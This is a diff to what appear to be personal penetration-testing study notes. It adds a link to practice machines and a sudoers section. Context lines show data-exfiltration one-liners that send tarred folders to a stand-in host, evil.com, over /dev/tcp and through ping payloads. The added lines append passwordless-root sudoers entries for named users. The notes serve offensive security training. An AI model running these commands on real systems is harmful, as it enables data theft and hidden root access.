@@ -1,5 +1,8 @@
 # Links
 
+https://emaragkos.gr/recommended-machines/
+
+
 https://fareedfauzi.gitbook.io/oscp-notes/
 
 https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
@@ -1762,8 +1765,6 @@ objdump -d tfc |grep ".plt"
 
 
 
-
-
 ### exfiltration
 
 <http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html>
@@ -1780,3 +1781,10 @@ tar zcf - localfolder | base64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/44
 tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q remotehost.evil.com; done
 
 ```
+
+
+# /etc/sudoers
+
+
+    echo "blumbergh ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+    echo "peter ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
